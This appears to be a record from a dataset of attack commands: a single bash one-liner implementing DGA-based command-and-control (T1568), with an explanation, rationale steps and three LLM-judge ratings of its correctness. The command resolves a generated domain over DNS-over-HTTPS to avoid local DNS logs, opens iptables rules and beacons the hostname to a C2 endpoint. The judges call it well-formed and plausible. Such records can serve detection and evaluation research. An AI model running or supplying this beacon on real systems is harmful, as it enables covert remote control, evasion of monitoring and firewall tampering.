command: bash -c 'd=$(date -u +%Y%m%d%H | md5sum | cut -c1-8).sync-cache.net; ip=$(curl -s "https://cloudflare-dns.com/dns-query?name=$d&type=A" -H "accept: application/dns-json" | grep -oE "\"data\":\"[0-9.]+\"" | head -n1 | cut -d\" -f4); if [ -n "$ip" ]; then port=$(shuf -i 20000-60000 -n1); iptables -I OUTPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT; iptables -I INPUT -p tcp -s "$ip" --sport "$port" -j ACCEPT; curl -fsS --connect-timeout 3 "https://$d:$port/api/v1/c2?node=$(hostname)"; fi'
explanation: Uses DNS-over-HTTPS to resolve a DGA domain, then configures iptables to allow traffic to the resolved IP on a random port and performs an HTTPS beacon. Demonstrates dynamic resolution without local DNS logs.
rationale_steps: Generate DGA domain using hourly seed
Resolve via DoH (Cloudflare) to avoid local DNS monitoring
Open iptables rules for the resolved IP and random port
Beacon to the resolved domain with curl over HTTPS

llm_judgments.syntactic_justification: Well-formed Bash with balanced quoting, valid pipes/semicolons, correct escaping of inner double-quotes, and valid flags for curl/grep/cut/iptables.
llm_judgments.semantic_justification: It algorithmically generates a DGA domain and resolves via DoH, then randomizes a port and attempts an HTTPS beacon consistent with T1568, but iptables changes require root and the random port likely lacks a listener.

llm_judgments.syntactic_justification: The command is well-formed with balanced quotes, proper semicolons and conditional logic, valid flag usage for all tools (curl, iptables, shuf, grep), and correct bash -c quoting.
llm_judgments.semantic_justification: The command accurately implements T1568 by generating a time-based DGA domain, resolving it via DNS-over-HTTPS to evade local DNS logging, dynamically selecting a random port, configuring iptables firewall rules to permit the C2 traffic, and beaconing with host identification — all operationally plausible and tightly aligned with dynamic resolution C2 techniques.

llm_judgments.syntactic_justification: The command follows correct Bash syntax, uses valid flags for all utilities (date, md5sum, cut, curl, grep, shuf, iptables), and handles quoting correctly.
llm_judgments.semantic_justification: The command accurately implements a DGA and DoH resolution; however, it requires root privileges to execute the iptables commands despite the metadata stating 'Privilege: None'.
